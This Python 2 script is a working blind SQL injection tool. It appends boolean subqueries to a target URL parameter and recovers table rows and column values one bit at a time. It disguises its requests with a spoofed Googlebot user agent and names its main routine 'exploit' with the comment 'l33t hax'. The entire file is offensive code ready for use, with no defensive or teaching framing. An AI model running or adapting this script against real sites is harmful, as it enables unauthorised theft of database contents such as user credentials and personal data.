#!/usr/bin/python2

import requests

options = {
    "target": "http://localhost/index.php?id=1",
    "cookies": "",
    "row_condition": "",
    "follow_redirections": 0,
    "assume_only_ascii": 0,
    "user_agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "table_name": "",
    "columns": "col1,col2",
    "truth_string": ""
}

# Here we store our dumped rows.
dump = []

# Fix the supplied target so requests doesn't complain.
def fix_host(host):
    if ((not host.startswith("http://")) and (not host.startswith("https://"))):
        host = "http://" + host
    if (host.endswith("/")):
        host = host[:-1]
    return host


def request(target):
    return requests.get(target,
                        headers={"user-agent": options["user_agent"]},
                        cookies=options["cookies"],
                        allow_redirects=bool(options["follow_redirections"])).text


# Grab the number of rows that we have to dump.
def getNumberOfRows():
    count = 1
    s = ''
    while True:
        target = '%s and ((select ascii(substr(count(%s), {index}, 1)) from %s)>>{shift})={result}' % (options['target'],
                                                                                                       options['columns'].split(',')[0],
                                                                                                       options['table_name'])
        target = target.replace('{index}', str(count))
        char = getChar(target)
        if char == 1:
            return int(s)
        else:
            s += str(char)
            count += 1


# Here we actually calculate a character.
def getChar(target, assume_ascii=bool(options['assume_only_ascii'])):
    otarget = target
    byte = ''
    for x in range(8):
        if x == 0 and assume_ascii:
            # If charset is ASCII, first bit is 0.
            byte += '0'
        else:
            target = otarget
            next_if_set = int(byte + '1', 2)
            # 7-x is a clever expression that evaluates to the current shift.
            target = target.replace('{shift}', str(7 - x))
            target = target.replace('{result}', str(next_if_set))
            response = request(target)
            if options['truth_string'] in response:
                byte += '1'
            else:
                byte += '0'
    # If it returned this, then we've gone past the length of what we're dumping.
    if byte == '00000000':
        return 1
    else:
        return chr(int(byte, 2))


# l33t hax
def exploit():
    options["target"] = fix_host(options["target"])
    columns = options['columns'].split(',')
    row_cells = []
    for column in columns:
        row_cells.append(column)
    dump.append(row_cells)
    if options["row_condition"]:
        row_cells = []
        for column in columns:
            count = 1
            s = ''
            while True:
                target = '%s and ((select ascii(substr(%s, {index}, 1)) from %s where %s)>>{shift})={result}' % (options['target'],
                                                                                                                 column,
                                                                                                                 options['table_name'],
                                                                                                                 options['row_condition'])
                target = target.replace('{index}', str(count))
                char = getChar(target)
                if char == 1:
                    break
                else:
                    s += str(char)
                    count += 1
            row_cells.append(s)
        dump.append(row_cells)
    else:
        no_of_rows = getNumberOfRows()
        for x in range(no_of_rows):
            row_cells = []
            for column in columns:
                count = 1
                s = ''
                while True:
                    target = '%s and ((select ascii(substr(%s, {index}, 1)) from %s limit {row_index},1)>>{shift})={result}' % (options['target'],
                                                                                                                                column,
                                                                                                                                options['table_name'])
                    target = target.replace('{row_index}', str(x))
                    target = target.replace('{index}', str(count))
                    char = getChar(target)
                    if char == 1:
                        break
                    else:
                        count += 1
                        s += str(char)
                row_cells.append(s)
            dump.append(row_cells)
    return dump

if __name__ == "__main__":
    print exploit()
